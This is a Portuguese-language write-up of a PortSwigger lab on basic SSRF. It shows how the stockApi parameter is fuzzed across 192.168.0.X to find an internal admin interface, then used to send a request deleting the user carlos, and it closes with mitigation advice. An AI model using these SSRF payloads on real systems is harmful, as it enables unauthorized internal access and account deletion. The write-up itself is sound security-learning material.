# Basic SSRF against another back-end system

**Módulo:** Server-side vulnerabilities //
**Dificuldade:** Apprentice //
**Categoria:** Server-side request forgery (SSRF) //
**Status:** Resolvida

## Objetivo

Este exercício dispõe de uma funcionalidade de verificação de stock que obtém dados de um sistema interno.

Para resolver o exercício, utilize a funcionalidade de verificação de stock para procurar, no intervalo interno 192.168.0.X, uma interface de administração na porta 8080 e, em seguida, utilize-a para eliminar o utilizador carlos.

## Reconhecimento

Antes de explorar a vulnerabilidade, foi necessário analisar como a funcionalidade de verificação de estoque realizava a comunicação com o servidor interno.

Ao selecionar a opção **Check stock**, a aplicação enviou uma requisição `POST /product/stock`.

Interceptando essa requisição, foi possível identificar o parâmetro `stockApi`, responsável por definir qual endereço seria consultado pelo servidor.

Como o objetivo do laboratório era localizar um servidor administrativo dentro da rede interna `192.168.0.X`, foi utilizada uma técnica de fuzzing para descobrir qual endereço IP hospedava a interface administrativa.

## Abordagem

- Acessamos a página de um produto qualquer.
- Clicamos em **Check stock** para gerar a requisição.
- Interceptamos a requisição `POST /product/stock`.
- Enviamos a requisição para o **OWASP ZAP** e utilizamos a ferramenta **Fuzz** para automatizar as tentativas.
- Configuramos o último octeto do endereço IP (`192.168.0.X`) como parâmetro variável.
- Executamos o fuzzing testando os endereços de `192.168.0.1` até `192.168.0.255`.
- Durante a análise das respostas, identificamos que o endereço `192.168.0.13` retornava a interface administrativa.
- Alteramos então o parâmetro `stockApi` para acessar o endpoint de exclusão de usuários:
  `http://192.168.0.13:8080/admin/delete?username=carlos`
- Enviamos a requisição e o usuário **carlos** foi removido, concluindo o laboratório.

## Payload / Técnica utilizada

Primeira requisição utilizada para identificar o servidor administrativo:

```http
POST /product/stock HTTP/1.1

stockApi=http://192.168.0.1:8080/admin
```

Foi realizado um processo de fuzzing sobre o último octeto do endereço IP:

```
192.168.0.1
192.168.0.2
192.168.0.3
...
192.168.0.13
...
192.168.0.255
```

Após identificar o servidor correto:

```http
POST /product/stock HTTP/1.1

stockApi=http://192.168.0.13:8080/admin/delete?username=carlos
```

---

## Evidência

![Evidência-01](imgs/Lab02%20-%20A.png)
![Evidência-02](imgs/Lab02%20-%20B.png)

## Resultado

A vulnerabilidade permitiu utilizar o servidor da aplicação para acessar diferentes máquinas da rede interna.

## Observações técnicas

### Por que a falha ocorre?

- A aplicação permite que o cliente controle o endereço para o qual o servidor realizará uma requisição HTTP.
- Como o servidor possui acesso à rede interna, um atacante pode utilizá-lo para realizar varreduras (*port scanning* e *host discovery*) em equipamentos que não são acessíveis externamente.
- Depois de localizar um serviço interno vulnerável, é possível interagir diretamente com ele por meio da aplicação, caracterizando uma vulnerabilidade de **Server-Side Request Forgery (SSRF)**.

### Como mitigar?

- Nunca permitir que usuários controlem diretamente o destino das requisições realizadas pelo servidor.
- Utilizar listas de permissões (*allowlists*) contendo apenas os domínios e endereços autorizados.
- Bloquear requisições para redes privadas, como `192.168.0.0/16`, `172.16.0.0/12` e `10.0.0.0/8`.
- Restringir o acesso da aplicação a recursos internos que não sejam estritamente necessários.
- Monitorar requisições incomuns que possam indicar tentativas de enumeração da rede interna.


## Referências

- [PortSwigger Web Security Academy](https://portswigger.net/web-security/ssrf) (link para o tópico, não para a lab específica com solução)
